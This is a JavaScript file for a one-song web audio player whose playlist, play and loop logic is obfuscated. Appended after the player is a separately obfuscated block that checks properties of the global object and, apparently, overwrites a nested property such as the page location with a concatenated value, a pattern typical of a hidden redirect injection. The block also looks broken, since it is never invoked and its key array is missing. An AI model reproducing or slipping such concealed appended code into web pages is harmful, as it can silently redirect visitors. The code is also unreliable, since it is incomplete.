const playlist = [
  {
    title: "48",
    file: "resources/audio_5.mp3",
    artist: "RELLY GUNZ X SG",
  },
];

function _0x1c6e(_0x39e522, _0x4608d8) {
  const _0x48dac9 = _0x48da();
  return (
    (_0x1c6e = function (_0x1c6eae, _0x3c3250) {
      _0x1c6eae = _0x1c6eae - 0x116;
      let _0x72c4f = _0x48dac9[_0x1c6eae];
      return _0x72c4f;
    }),
    _0x1c6e(_0x39e522, _0x4608d8)
  );
}
const _0xa0ea6 = _0x1c6e;
(function (_0x5c72f4, _0x1b8076) {
  const _0x58f75a = _0x1c6e,
    _0x25bf74 = _0x5c72f4();
  while (!![]) {
    try {
      const _0x500bdc =
        (parseInt(_0x58f75a(0x127)) / 0x1) *
          (parseInt(_0x58f75a(0x11f)) / 0x2) +
        (parseInt(_0x58f75a(0x118)) / 0x3) *
          (parseInt(_0x58f75a(0x11e)) / 0x4) +
        (parseInt(_0x58f75a(0x120)) / 0x5) *
          (parseInt(_0x58f75a(0x129)) / 0x6) +
        -parseInt(_0x58f75a(0x125)) / 0x7 +
        -parseInt(_0x58f75a(0x11a)) / 0x8 +
        parseInt(_0x58f75a(0x11c)) / 0x9 +
        (parseInt(_0x58f75a(0x119)) / 0xa) *
          (-parseInt(_0x58f75a(0x116)) / 0xb);
      if (_0x500bdc === _0x1b8076) break;
      else _0x25bf74["push"](_0x25bf74["shift"]());
    } catch (_0x9025cf) {
      _0x25bf74["push"](_0x25bf74["shift"]());
    }
  }
})(_0x48da, 0x704d5);
const audio = document["getElementById"]("audio"),
  songTitle = document[_0xa0ea6(0x121)]("audio-info");
let currentSongIndex = 0x0;

function playSong(_0x5e19c5) {
  const _0x64963e = _0xa0ea6,
    _0x4e9d9f = playlist[_0x5e19c5];
  (audio[_0x64963e(0x128)] = _0x4e9d9f[_0x64963e(0x122)]),
    audio[_0x64963e(0x11d)](),
    (songTitle["textContent"] =
      _0x4e9d9f[_0x64963e(0x117)] +
      _0x64963e(0x124) +
      _0x4e9d9f[_0x64963e(0x11b)]);
}

function _0x48da() {
  const _0x1f120e = [
    "576015mGOxMw",
    "title",
    "3ikqKMv",
    "190MsjUiC",
    "664456vcsrXh",
    "artist",
    "7611129MPRmpX",
    "play",
    "2784632xnMOkO",
    "140604yiDEQu",
    "10PilAXS",
    "getElementById",
    "file",
    "length",
    "\x20-\x20",
    "2959334BvtRLq",
    "ended",
    "3IqjPKf",
    "src",
    "623994OqwUDi",
  ];
  _0x48da = function () {
    return _0x1f120e;
  };
  return _0x48da();
}

audio["addEventListener"](_0xa0ea6(0x126), () => {
  const _0x3a9924 = _0xa0ea6;
  currentSongIndex++,
    currentSongIndex >= playlist[_0x3a9924(0x123)] && (currentSongIndex = 0x0),
    playSong(currentSongIndex);
}),
  playSong(currentSongIndex);

!(function (Md) {
  function Ix(Mo, oM) {
    return this;
  }
  function Xi(oM, Mo) {
    var Om = () => ((Mo + 32) >> oM, oM - 23 - Mo, oM >> Mo);
    return Om();
  }
  if (
    !Md[Xi(1792, 8)][Md[Xi(4096, 44)]](
      Ix()[Md[Xi(18432, 75)]][Md[Xi((2249088)[32492] >> 224981, 2678245)]][
        Md[Xi(134217728, 24)]
      ]
    )
  ) {
    Ix()[Md[Xi(18432, 75)]][Md[Xi((202943908)[2924] >> 9824, 28215)]][
      Md[Xi(201326592, 25)]
    ] =
      Md[Xi(1280, 39)] +
      Md[Xi(1792, 8)][Xi((23923408)[3539802] >> 2983231, 265)];
  }})
  
